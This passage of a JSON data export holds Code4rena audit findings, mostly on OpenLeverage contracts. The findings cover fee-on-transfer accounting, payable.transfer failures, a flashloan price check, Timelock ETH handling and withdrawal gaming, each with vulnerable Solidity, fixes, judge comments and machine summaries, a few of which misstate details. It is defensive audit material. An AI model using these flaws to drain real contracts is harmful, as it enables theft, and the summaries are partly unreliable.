      "content": "_Submitted by hyh_\n\nThe amount that OpenLevV1 will receive can be less than V3 DEX indicated as a swap result, while it is used as given for position debt repayment accounting.\n\nThis way actual funds received can be less than accounted, leaving to system funds deficit, which can be exploited by a malicious user, draining contract funds with multiple open/close with a taxed token.\n\nIn the `trade.depositToken != longToken` case when `flashSell` is used this can imply inability to send remainder funds to a user and the failure of the whole closeTrade function, the end result is a freezing of user's funds within the system.\n\n#### Proof of Concept\n\n`trade.depositToken != longToken` case, can be wrong repayment accounting, which will lead to a deficit if the received funds are less than DEX returned `closeTradeVars.receiveAmount`.\n\nAs a side effect, `doTransferOut` is done without balance check, so the whole position close can revert, leading to inability to close the position and freeze of user's funds this way:\n\n<https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/OpenLevV1.sol#L197-204>\n\nI.e. if there is enough funds in the system they will be drained, if there is not enough funds, user's position close will fail.\n\nV3 sell function doesn't check for balance change, using DEX returned amount as is:\n\n<https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/dex/eth/UniV3Dex.sol#L61-70>\n\n#### Recommended Mitigation Steps\n\nIf fee on tranfer tokens are fully in scope, do control all the accounting and amounts to be returned to a user via balance before/after calculations for DEX V3 logic as well.\n\n**[ColaM12 (OpenLeverage) confirmed and resolved](https://github.com/code-423n4/2022-01-openleverage-findings/issues/104)**\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2022-01-openleverage-findings/issues/104#issuecomment-1045996325):**\n > Awesome find. I was able to confirm that `UniV3Dex.uniV3Sell()` does not properly handle fee-on-transfer tokens by treating the amount received as the difference between before balance and after balance.\n\n\n\n***\n\n",
      "summary": "\nThe report describes a bug in the OpenLeverageV1 system where the amount received by the system can be less than the amount indicated by the V3 DEX swap result. This can lead to a deficit in the system, which can be exploited by a malicious user to drain contract funds. The bug occurs when the `trade.depositToken` is not equal to the `longToken` and the `flashSell` function is used. This can result in the inability to send remaining funds to the user and the failure of the `closeTrade` function, causing the user's funds to be frozen. The bug has been confirmed and resolved by the OpenLeverage team. A recommended mitigation step is to control all accounting and amounts to be returned to the user before and after DEX V3 logic. It was also found that the `UniV3Dex.uniV3Sell()` function does not properly handle fee-on-transfer tokens, which was confirmed by a judge.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "OpenLeverage",
      "source_link": "https://code4rena.com/reports/2022-01-openleverage",
      "github_link": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/104",
      "tags": [],
      "finders": []
    },
    {
      "id": "42442",
      "title": "[M-01] `UniV2ClassDex.sol#uniClassSell()` Tokens with fee on transfer are not fully supported",
      "impact": "MEDIUM",
      "content": "_Submitted by WatchPug_\n\n<https://github.com/code-423n4/2022-01-openleverage/blob/501e8f5c7ebaf1242572712626a77a3d65bdd3ad/openleverage-contracts/contracts/dex/bsc/UniV2ClassDex.sol#L31-L56>\n\n```solidity\nfunction uniClassSell(DexInfo memory dexInfo,\n    address buyToken,\n    address sellToken,\n    uint sellAmount,\n    uint minBuyAmount,\n    address payer,\n    address payee\n) internal returns (uint buyAmount){\n    address pair = getUniClassPair(buyToken, sellToken, dexInfo.factory);\n    IUniswapV2Pair(pair).sync();\n    (uint256 token0Reserves, uint256 token1Reserves,) = IUniswapV2Pair(pair).getReserves();\n    sellAmount = transferOut(IERC20(sellToken), payer, pair, sellAmount);\n    uint balanceBefore = IERC20(buyToken).balanceOf(payee);\n    dexInfo.fees = getPairFees(dexInfo, pair);\n    if (buyToken < sellToken) {\n        buyAmount = getAmountOut(sellAmount, token1Reserves, token0Reserves, dexInfo.fees);\n        IUniswapV2Pair(pair).swap(buyAmount, 0, payee, \"\");\n    } else {\n        buyAmount = getAmountOut(sellAmount, token0Reserves, token1Reserves, dexInfo.fees);\n        IUniswapV2Pair(pair).swap(0, buyAmount, payee, \"\");\n    }\n\n    require(buyAmount >= minBuyAmount, 'buy amount less than min');\n    uint bought = IERC20(buyToken).balanceOf(payee).sub(balanceBefore);\n    return bought;\n}\n```\n\nWhile `uniClassBuy()` correctly checks the actually received amount by comparing the before and after the balance of the receiver, `uniClassSell()` trusted the result given by `getAmountOut()`. This makes `uniClassSell()` can result in an output amount fewer than `minBuyAmount`.\n\n<https://github.com/code-423n4/2022-01-openleverage/blob/501e8f5c7ebaf1242572712626a77a3d65bdd3ad/openleverage-contracts/contracts/dex/bsc/UniV2ClassDex.sol#L101-L102>\n\n#### Recommendation\n\nChange to:\n\n```solidity\nfunction uniClassSell(DexInfo memory dexInfo,\n    address buyToken,\n    address sellToken,\n    uint sellAmount,\n    uint minBuyAmount,\n    address payer,\n    address payee\n) internal returns (uint bought){\n    address pair = getUniClassPair(buyToken, sellToken, dexInfo.factory);\n    IUniswapV2Pair(pair).sync();\n    (uint256 token0Reserves, uint256 token1Reserves,) = IUniswapV2Pair(pair).getReserves();\n    sellAmount = transferOut(IERC20(sellToken), payer, pair, sellAmount);\n    uint balanceBefore = IERC20(buyToken).balanceOf(payee);\n    dexInfo.fees = getPairFees(dexInfo, pair);\n    if (buyToken < sellToken) {\n        buyAmount = getAmountOut(sellAmount, token1Reserves, token0Reserves, dexInfo.fees);\n        IUniswapV2Pair(pair).swap(buyAmount, 0, payee, \"\");\n    } else {\n        buyAmount = getAmountOut(sellAmount, token0Reserves, token1Reserves, dexInfo.fees);\n        IUniswapV2Pair(pair).swap(0, buyAmount, payee, \"\");\n    }\n    uint bought = IERC20(buyToken).balanceOf(payee).sub(balanceBefore);\n    require(bought >= minBuyAmount, 'buy amount less than min');\n}\n```\n\n**[ColaM12 (OpenLeverage) confirmed and resolved](https://github.com/code-423n4/2022-01-openleverage-findings/issues/208)**\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2022-01-openleverage-findings/issues/208#issuecomment-1050844620):**\n > Agree with this finding! Uniswap token swaps are meant to support all types of tokens. It does seem possible for there to be `payer` to experience increased slippage because the check operates on `getAmountOut()` and not the `bought` output.\n >\n > It's fair to say that this will lead to value leakage, so I think `medium` severity is justified.\n\n\n\n***\n\n",
      "summary": "\nThe bug report is about a function called `uniClassSell()` in a contract called `UniV2ClassDex.sol`. This function is used for selling tokens on a decentralized exchange. The bug was found by a user named WatchPug and reported on GitHub.\n\nThe code for `uniClassSell()` is shown in lines 31-56 of the contract. The function is supposed to check the amount of tokens received by the seller and make sure it is not less than the minimum amount they want to receive. However, the code only checks the result given by a function called `getAmountOut()`, which can sometimes be incorrect. This means that the seller could end up receiving less than the minimum amount they expected.\n\nThe recommended solution is to change the code to also check the actual amount received by comparing the before and after balance of the seller. This will ensure that the seller always receives the minimum amount they expect.\n\nThe bug has been confirmed and resolved by a user named ColaM12 from the OpenLeverage team. Another user named 0xleastwood, who is a judge, also commented on the bug and agreed with the finding. They stated that this bug could lead to value leakage and suggested that a medium severity rating is appropriate.\n\nThis bug report serves as a reminder to always thoroughly test and check for potential errors in code, especially when dealing with financial transactions. It also shows the importance of reporting and fixing bugs to ensure the safety and reliability of smart contracts.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "OpenLeverage",
      "source_link": "https://code4rena.com/reports/2022-01-openleverage",
      "github_link": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/208",
      "tags": [],
      "finders": []
    },
    {
      "id": "42441",
      "title": "[H-01] OpenLevV1Lib's and LPool's `doTransferOut` functions call native `payable.transfer`, which can be unusable for smart contract calls",
      "impact": "HIGH",
      "content": "_Submitted by hyh_\n\nWhen OpenLev operations use a wrapped native token, the whole user withdraw is being handled with a `payable.transfer()` call.\n\nThis is unsafe as `transfer` has hard coded gas budget and can fail when the user is a smart contract. This way any programmatical usage of OpenLevV1 and LPool is at risk.\n\nWhenever the user either fails to implement the payable fallback function or cumulative gas cost of the function sequence invoked on a native token transfer exceeds 2300 gas consumption limit the native tokens sent end up undelivered and the corresponding user funds return functionality will fail each time.\n\nAs OpenLevV1 `closeTrade` is affected this includes user's principal funds freeze scenario, so marking the issue as a high severity one.\n\n#### Proof of Concept\n\nOpenLevV1Lib and LPool have `doTransferOut` function that calls native token payable.transfer:\n\nOpenLevV1Lib.doTransferOut\n\n<https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/OpenLevV1Lib.sol#L253>\n\nLPool.doTransferOut\n\n<https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/liquidity/LPool.sol#L297>\n\nLPool.doTransferOut is used in LPool redeem and borrow, while OpenLevV1Lib.doTransferOut is used in OpenLevV1 trade manipulation logic:\n\ncloseTrade\n\n<https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/OpenLevV1.sol#L204>\n\n<https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/OpenLevV1.sol#L215>\n\nliquidate\n\n<https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/OpenLevV1.sol#L263>\n\n<https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/OpenLevV1.sol#L295>\n\n<https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/OpenLevV1.sol#L304>\n\n#### References\n\nThe issues with `transfer()` are outlined here:\n\n<https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/>\n\n#### Recommended Mitigation Steps\n\nOpenLevV1's `closeTrade` and `liquidate` as well as LPool's `redeem`, `redeemUnderlying`, `borrowBehalf`, `repayBorrowBehalf`, `repayBorrowEndByOpenLev` are all `nonReentrant`, so reentrancy isn't an issue and `transfer()` can be just replaced.\n\nUsing low-level `call.value(amount)` with the corresponding result check or using the OpenZeppelin `Address.sendValue` is advised:\n\n<https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol#L60>\n\n**[ColaM12 (OpenLeverage) confirmed and resolved](https://github.com/code-423n4/2022-01-openleverage-findings/issues/75)**\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2022-01-openleverage-findings/issues/75#issuecomment-1045627508):**\n > Awesome find! Completely agree with the warden here. This would prevent users from calling sensitive functions which withdraw their funds in some way. \n\n\n\n***\n\n \n",
      "summary": "\nThe report discusses a bug in the OpenLevV1 and LPool contracts. When a user withdraws their funds using a wrapped native token, the `payable.transfer()` function is used. However, this function is unsafe as it has a hardcoded gas budget and can fail when the user is a smart contract. This can cause the user's funds to not be delivered and can lead to the failure of important functions such as `closeTrade` and `liquidate`. The report recommends replacing `transfer()` with a safer alternative such as `call.value(amount)` or using the OpenZeppelin `Address.sendValue` function. This issue has been confirmed and resolved by the team. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "OpenLeverage",
      "source_link": "https://code4rena.com/reports/2022-01-openleverage",
      "github_link": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/75",
      "tags": [],
      "finders": []
    },
    {
      "id": "1358",
      "title": "[M-05] anti-flashloan mechanism may lead to protocol default",
      "impact": "MEDIUM",
      "content": "_Submitted by gzeon_\n\nThere is a price check to avoid flash loan attacks which significantly moved the price. If current price is 5% lower than the stored twap price, the liquidation will fail. This design can be dangerous as it is to openleverage's benefit to close under-collateralized position ASAP when there is a huge market drawdown. When the market keep trading downward, it is possible that the spot price keep trading 5% lower than the twap, which prevent any liquidation from happening and causing the protocol to be under-collateralized.\n\n#### Proof of Concept\n\n<https://github.com/code-423n4/2022-01-openleverage/blob/501e8f5c7ebaf1242572712626a77a3d65bdd3ad/openleverage-contracts/contracts/OpenLevV1Lib.sol#L191>\n\n```solidity\n// Avoid flash loan\nif (prices.price < prices.cAvgPrice) {\n    uint differencePriceRatio = prices.cAvgPrice.mul(100).div(prices.price);\n    require(differencePriceRatio - 100 < maxLiquidationPriceDiffientRatio, 'MPT');\n}\n``` \n\n#### Recommended Mitigation Steps\n\nInstead of revert with `maxLiquidationPriceDiffientRatio`, use the twap price to determine if the position is healthy.\n\n**[ColaM12 (OpenLeverage) disputed](https://github.com/code-423n4/2022-01-openleverage-findings/issues/233)**\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2022-01-openleverage-findings/issues/233#issuecomment-1045995096):**\n > From first impression, this finding seems legitimate. Can I get some more details on why it was disputed? @ColaM12 \n\n**[ColaM12 (OpenLeverage) commented](https://github.com/code-423n4/2022-01-openleverage-findings/issues/233#issuecomment-1046409471):**\n > There is always a chance to front run a flash loan transaction before trading in OpenLev. Also, see in line [196]( https://github.com/code-423n4/2022-01-openleverage/blob/501e8f5c7ebaf1242572712626a77a3d65bdd3ad/openleverage-contracts/contracts/OpenLevV1Lib.sol#L196), position is considered not healthy only if all three price check failed including the twap price.\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2022-01-openleverage-findings/issues/233#issuecomment-1046517723):**\n > It looks like only one condition would need to be satisfied for `isPositionHealthy` to return false as it uses `||` and not `&&`.\n\n**[ColaM12 (OpenLeverage) commented](https://github.com/code-423n4/2022-01-openleverage-findings/issues/233#issuecomment-1046560642):**\n > Do you mean return true? All 3 price checks should fail when liquidating. But the position may still hold funds to pay off debt. by using maxLiquidationPriceDiffientRatio, under-priced-swaps can be limited . Otherwise, all remaining funds in the position could be drained from a flash loan attack which directly leads to a bad debt to lender.\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2022-01-openleverage-findings/issues/233#issuecomment-1046580257):**\n > Ahh sorry my mistake. I misinterpreted that.\n >\n > I agree with the sponsor here. The issue outlined by the warden seems to be safeguarded by the two other checks in `isPositionHealthy()`\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2022-01-openleverage-findings/issues/233#issuecomment-1046623163):**\n > Actually thinking about this more, I think the warden raised an issue related to the liquidations continuing to fail if the price keeps trending downward at an accelerated pace. I don't think the protocol would be able to respond to such events if [this](https://github.com/code-423n4/2022-01-openleverage/blob/501e8f5c7ebaf1242572712626a77a3d65bdd3ad/openleverage-contracts/contracts/OpenLevV1Lib.sol#L194) reverts.\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2022-01-openleverage-findings/issues/233#issuecomment-1046665362):**\n > After discussion with the sponsor, we have agreed that this issue is valid. It is expected that the TWAP is only valid for 1 min. By removing this condition, there is potential for even larger security issues. So the sponsor has decided to make this a wont-fix but I'll keep the issue open as it is valid.\n >\n > This was an awesome find!\n\n\n\n***\n\n",
      "summary": "\nThis bug report concerns the OpenLeverage protocol, which is used to avoid flash loan attacks. The issue is that if the current spot price is 5% lower than the stored twap price, the liquidation will fail. This can be dangerous as it prevents the protocol from closing under-collateralized positions quickly when there is a huge market drawdown. The proof of concept is a code snippet that checks the current price against the twap price and reverts with a message if it is too low. The recommended mitigation step is to use the twap price to determine if the position is healthy, rather than reverting with a message.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "OpenLeverage",
      "source_link": "https://code4rena.com/reports/2022-01-openleverage",
      "github_link": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/233",
      "tags": [],
      "finders": [
        "gzeon"
      ]
    },
    {
      "id": "1357",
      "title": "[M-04] OpenLevV1.closeTrade with V3 DEX doesnt correctly accounts fee on transfer tokens for repayments",
      "impact": "MEDIUM",
      "content": "## Handle\n\nhyh\n\n\n## Vulnerability details\n\n## Impact\n\nThe amount that OpenLevV1 will receive can be less than V3 DEX indicated as a swap result, while it is used as given for position debt repayment accounting.\n\nThis way actual funds received can be less than accounted, leaving to system funds deficit, which can be exploited by a malicious user, draining contract funds with multiple open/close with a taxed token.\n\nIn the `trade.depositToken != longToken` case when `flashSell` is used this can imply inability to send remainder funds to a user and the failure of the whole closeTrade function, the end result is a freezing of user's funds within the system.\n\n## Proof of Concept\n\n`trade.depositToken != longToken` case, can be wrong repayment accounting, which will lead to a deficit if the received funds are less than DEX returned `closeTradeVars.receiveAmount`.\n\nAs a side effect, `doTransferOut` is done without balance check, so the whole position close can revert, leading to inability to close the position and freeze of user's funds this way:\n\nhttps://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/OpenLevV1.sol#L197-204\n\n\nI.e. if there is enough funds in the system they will be drained, if there is not enough funds, user's position close will fail.\n\n\nV3 sell function doesn't check for balance change, using DEX returned amount as is:\n\nhttps://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/dex/eth/UniV3Dex.sol#L61-70\n\n## Recommended Mitigation Steps\n\nIf fee on tranfer tokens are fully in scope, do control all the accounting and amounts to be returned to a user via balance before/after calculations for DEX V3 logic as well.",
      "summary": "\nA bug has been reported in OpenLevV1 which can lead to a funds deficit if the amount received is less than the amount indicated by V3 DEX as a swap result. This can be exploited by a malicious user to drain contract funds with multiple open/close with a taxed token. If there are not enough funds in the system, the position close can fail and user's funds can be frozen. The V3 sell function doesn't check for balance change, using DEX returned amount as is. To mitigate this issue, it is recommended to control all the accounting and amounts to be returned to a user via balance before/after calculations for DEX V3 logic.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "OpenLeverage",
      "source_link": "https://code4rena.com/reports/2022-01-openleverage",
      "github_link": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/104",
      "tags": [
        "Fee On Transfer"
      ],
      "finders": [
        "hyh"
      ]
    },
    {
      "id": "1356",
      "title": "[M-03] Eth sent to Timelock will be locked in current implementation",
      "impact": "MEDIUM",
      "content": "_Submitted by defsec_\n\nEth sent to Timelock will be locked in current implementation. I came across this problem while playing around with the governance contract.\n\n#### Proof of Concept\n\n*   Setup the governance contracts (GovernanceAlpha, Timelock)\n*   Send eth to timelock contract\n*   Setup a proposal to send 0.1 eth out. Code snippet in ether.js below. proxy refers to GovernorAlpha.\n\n```js\nawait proxy.propose(\n    [signers[3].address],\n    [ethers.utils.parseEther(\"0.1\")],\n    [\"\"],\n    [ethers.BigNumber.from(0)],\n    \"Send funds to 3rd signer\"\n);\n```\n*   Vote and have the proposal succeed.\n*   Execute the proposal, the proposal number here is arbitrary.\n\n```js\nawait proxy.execute(2);  // this fails\n    await proxy.execute(2, {value: ethers.utils.parseEther(\"0.1\")})  // this would work\n    0.1 eth will be sent out, but it is sent from the msg.sender not from the timelock contract.\n```\n\n#### Recommended Mitigation Steps\n\nConsider implementing the following code.\n```solidity\n\nfunction execute(uint proposalId) external {\n    require(state(proposalId) == ProposalState.Queued, \"GovernorAlpha::execute: proposal can only be executed if it is queued\");\n    Proposal storage proposal = proposals[proposalId];\n    proposal.executed = true;\n    for (uint i = 0; i < proposal.targets.length; i++) {\n        timelock.executeTransaction(proposal.targets[i], proposal.values[i], proposal.signatures[i], proposal.calldatas[i], proposal.eta);\n    }\n    emit ProposalExecuted(proposalId);\n}\n```\n\n#### Reference\n\n<https://github.com/compound-finance/compound-protocol/pull/177/files>\n\n**[ColaM12 (OpenLeverage) acknowledged](https://github.com/code-423n4/2022-01-openleverage-findings/issues/80)**\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2022-01-openleverage-findings/issues/80#issuecomment-1045994865):**\n > I agree with this finding!\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an issue in the governance contract where eth sent to Timelock will be locked in the current implementation. This was discovered while playing around with the governance contract. The proof of concept involves setting up the governance contracts (GovernanceAlpha, Timelock), sending eth to the timelock contract, setting up a proposal to send 0.1 eth out, voting and having the proposal succeed, and executing the proposal. When the proposal is executed, the 0.1 eth will be sent out, but it is sent from the msg.sender not from the timelock contract.\n\nTo mitigate this issue, consider implementing the code provided in the report. This code will ensure that the proposal can only be executed if it is queued and that the proposal will be executed from the timelock contract. \n\nOverall, this bug report provides a proof of concept and a recommended mitigation step for an issue in the governance contract where eth sent to Timelock will be locked in the current implementation.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "OpenLeverage",
      "source_link": "https://code4rena.com/reports/2022-01-openleverage",
      "github_link": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/80",
      "tags": [],
      "finders": [
        "defsec"
      ]
    },
    {
      "id": "1355",
      "title": "[M-02] Missing payable",
      "impact": "MEDIUM",
      "content": "_Submitted by robee_\n\nThe following functions are not payable but uses msg.value - therefore the function must be payable.\nThis can lead to undesired behavior.\n\n        LPool.sol, addReserves should be payable since using msg.value\n\n**[ColaM12 (OpenLeverage) confirmed and resolved](https://github.com/code-423n4/2022-01-openleverage-findings/issues/61)**\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2022-01-openleverage-findings/issues/61#issuecomment-1045990204):**\n > Nice find! The warden has identified a function which is missing the `payable` keyword. Preventing any users from adding reserves using native ether.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the LPool.sol contract. The function addReserves is not payable, but it uses msg.value. This means that it can lead to undesired behavior. To fix the vulnerability, the function should be made payable. This means that anyone calling the function should be able to pay for it. This will ensure that the function is not misused.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "OpenLeverage",
      "source_link": "https://code4rena.com/reports/2022-01-openleverage",
      "github_link": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/61",
      "tags": [],
      "finders": [
        "robee"
      ]
    },
    {
      "id": "1354",
      "title": "[M-01] UniV2ClassDex.sol#uniClassSell() Tokens with fee on transfer are not fully supported",
      "impact": "MEDIUM",
      "content": "## Handle\n\nWatchPug\n\n\n## Vulnerability details\n\nhttps://github.com/code-423n4/2022-01-openleverage/blob/501e8f5c7ebaf1242572712626a77a3d65bdd3ad/openleverage-contracts/contracts/dex/bsc/UniV2ClassDex.sol#L31-L56\n\n```solidity\nfunction uniClassSell(DexInfo memory dexInfo,\n    address buyToken,\n    address sellToken,\n    uint sellAmount,\n    uint minBuyAmount,\n    address payer,\n    address payee\n) internal returns (uint buyAmount){\n    address pair = getUniClassPair(buyToken, sellToken, dexInfo.factory);\n    IUniswapV2Pair(pair).sync();\n    (uint256 token0Reserves, uint256 token1Reserves,) = IUniswapV2Pair(pair).getReserves();\n    sellAmount = transferOut(IERC20(sellToken), payer, pair, sellAmount);\n    uint balanceBefore = IERC20(buyToken).balanceOf(payee);\n    dexInfo.fees = getPairFees(dexInfo, pair);\n    if (buyToken < sellToken) {\n        buyAmount = getAmountOut(sellAmount, token1Reserves, token0Reserves, dexInfo.fees);\n        IUniswapV2Pair(pair).swap(buyAmount, 0, payee, \"\");\n    } else {\n        buyAmount = getAmountOut(sellAmount, token0Reserves, token1Reserves, dexInfo.fees);\n        IUniswapV2Pair(pair).swap(0, buyAmount, payee, \"\");\n    }\n\n    require(buyAmount >= minBuyAmount, 'buy amount less than min');\n    uint bought = IERC20(buyToken).balanceOf(payee).sub(balanceBefore);\n    return bought;\n}\n```\n\nWhile `uniClassBuy()` correctly checks the actually received amount by comparing the before and after the balance of the receiver, `uniClassSell()` trusted the result given by `getAmountOut()`. This makes `uniClassSell()` can result in an output amount fewer than `minBuyAmount`.\n\nhttps://github.com/code-423n4/2022-01-openleverage/blob/501e8f5c7ebaf1242572712626a77a3d65bdd3ad/openleverage-contracts/contracts/dex/bsc/UniV2ClassDex.sol#L101-L102\n\n### Recommendation\n\nChange to:\n\n```solidity\nfunction uniClassSell(DexInfo memory dexInfo,\n    address buyToken,\n    address sellToken,\n    uint sellAmount,\n    uint minBuyAmount,\n    address payer,\n    address payee\n) internal returns (uint bought){\n    address pair = getUniClassPair(buyToken, sellToken, dexInfo.factory);\n    IUniswapV2Pair(pair).sync();\n    (uint256 token0Reserves, uint256 token1Reserves,) = IUniswapV2Pair(pair).getReserves();\n    sellAmount = transferOut(IERC20(sellToken), payer, pair, sellAmount);\n    uint balanceBefore = IERC20(buyToken).balanceOf(payee);\n    dexInfo.fees = getPairFees(dexInfo, pair);\n    if (buyToken < sellToken) {\n        buyAmount = getAmountOut(sellAmount, token1Reserves, token0Reserves, dexInfo.fees);\n        IUniswapV2Pair(pair).swap(buyAmount, 0, payee, \"\");\n    } else {\n        buyAmount = getAmountOut(sellAmount, token0Reserves, token1Reserves, dexInfo.fees);\n        IUniswapV2Pair(pair).swap(0, buyAmount, payee, \"\");\n    }\n    uint bought = IERC20(buyToken).balanceOf(payee).sub(balanceBefore);\n    require(bought >= minBuyAmount, 'buy amount less than min');\n}\n```",
      "summary": "\nThis bug report is about the code in the function uniClassSell() in the code repository of WatchPug. In the code, the amount of buyToken the payee receives is not correctly checked and can be fewer than the minimum buy amount. The recommendation is to change the code to check the bought amount by comparing the before and after balance of the receiver.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "OpenLeverage",
      "source_link": "https://code4rena.com/reports/2022-01-openleverage",
      "github_link": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/208",
      "tags": [
        "Fee On Transfer"
      ],
      "finders": [
        "WatchPug"
      ]
    },
    {
      "id": "1353",
      "title": "[H-01] OpenLevV1Libs and LPools doTransferOut functions call native payable.transfer, which can be unusable for smart contract calls",
      "impact": "HIGH",
      "content": "## Handle\n\nhyh\n\n\n## Vulnerability details\n\n## Impact\n\nWhen OpenLev operations use a wrapped native token, the whole user withdraw is being handled with a `payable.transfer()` call.\n\nThis is unsafe as `transfer` has hard coded gas budget and can fail when the user is a smart contract. This way any programmatical usage of OpenLevV1 and LPool is at risk.\n\nWhenever the user either fails to implement the payable fallback function or cumulative gas cost of the function sequence invoked on a native token transfer exceeds 2300 gas consumption limit the native tokens sent end up undelivered and the corresponding user funds return functionality will fail each time.\n\nAs OpenLevV1 `closeTrade` is affected this includes user's principal funds freeze scenario, so marking the issue as a high severity one.\n\n## Proof of Concept\n\nOpenLevV1Lib and LPool have `doTransferOut` function that calls native token payable.transfer:\n\nOpenLevV1Lib.doTransferOut\n\nhttps://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/OpenLevV1Lib.sol#L253\n\n\nLPool.doTransferOut\n\nhttps://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/liquidity/LPool.sol#L297\n\n\nLPool.doTransferOut is used in LPool redeem and borrow, while OpenLevV1Lib.doTransferOut is used in OpenLevV1 trade manipulation logic:\n\ncloseTrade\n\nhttps://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/OpenLevV1.sol#L204\n\nhttps://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/OpenLevV1.sol#L215\n\n\nliquidate\n\nhttps://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/OpenLevV1.sol#L263\n\nhttps://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/OpenLevV1.sol#L295\n\nhttps://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/OpenLevV1.sol#L304\n\n\n## References\n\nThe issues with `transfer()` are outlined here:\n\nhttps://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/\n\n\n## Recommended Mitigation Steps\n\nOpenLevV1's `closeTrade` and `liquidate` as well as LPool's `redeem`, `redeemUnderlying`, `borrowBehalf`, `repayBorrowBehalf`, `repayBorrowEndByOpenLev` are all `nonReentrant`, so reentrancy isn't an issue and `transfer()` can be just replaced.\n\nUsing low-level `call.value(amount)` with the corresponding result check or using the OpenZeppelin `Address.sendValue` is advised:\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol#L60",
      "summary": "\nThis bug report is about an issue with OpenLev and LPool operations when using a wrapped native token. The issue is that when a user withdraws, the whole process is handled with a `payable.transfer()` call, which has a hard-coded gas budget and can fail if the user is a smart contract. This means that any programmatic usage of OpenLevV1 and LPool is at risk, and user funds can be frozen in the principal funds freeze scenario. The proof of concept provided in the report outlines the affected functions, and the recommended mitigation steps are to replace the `transfer()` with either a low-level `call.value(amount)` with the corresponding result check or with the OpenZeppelin `Address.sendValue`.",
      "quality_score": 3,
      "rarity_score": 1,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "OpenLeverage",
      "source_link": "https://code4rena.com/reports/2022-01-openleverage",
      "github_link": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/75",
      "tags": [
        "call vs transfer"
      ],
      "finders": [
        "hyh"
      ]
    },
    {
      "id": "42440",
      "title": "[M-07] `requestWithdraw` without obligation to withdraw allow underwriter to avoid payout",
      "impact": "MEDIUM",
      "content": "_Submitted by gzeon_\n\nTo prevent withdrawal front-running, a lockup period is set between withdrawal request and withdrawal. However, there are no obligation to withdraw after the lockup period and the capital will keep earning premium during lockup. A strategy for underwriter is to keep requesting withdrawal every `lockup period` to keep their average lockup to `lockup period/2`.\n\n#### Proof of Concept\n\n<https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/PoolTemplate.sol#L279>\n\nAssuming\n\n1.  Reporting DAO vote last for 24 hours (according to docs) plus there will be delay between the hack and vote creation\n2.  the `lockup period` is set to 86400 (24 hours) in the supplied test cases\n\nIt is very likely an underwriter can avoid payout by such strategy since their effective lockup would be 12 hours only. They will continue to earn yield in the pool and only require some extra gas cost for the `requestWithdraw` every 24 hours.\n\n#### Recommended Mitigation Steps\n\nExtend the lockup period at least by a factor of 2 or force underwriter to withdraw after lockup period.\n\n\n**[oishun1112 (Insure) acknowledged](https://github.com/code-423n4/2022-01-insure-findings/issues/295):**\n > Yes, lock up period is going to be like a week~2week in production.\n\n\n",
